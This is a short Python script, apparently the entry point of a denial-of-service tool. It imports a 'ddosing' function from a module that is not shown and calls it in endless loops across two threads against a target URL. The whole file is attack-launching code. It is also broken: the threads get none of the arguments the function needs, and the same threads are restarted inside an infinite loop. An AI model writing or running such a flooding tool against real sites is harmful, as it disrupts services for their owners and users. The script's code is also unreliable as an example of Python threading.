from core.main import ddosing 
from threading import Thread

def main_func(target_url, threads): 
    while True: 
        ddosing(url=target_url, threads=threads)  


th1 = Thread(target=main_func) 
th2 = Thread(target=main_func) 


if __name__ == "__main__": 
    while True: 
        print(th1.start()) 
        print(th2.start())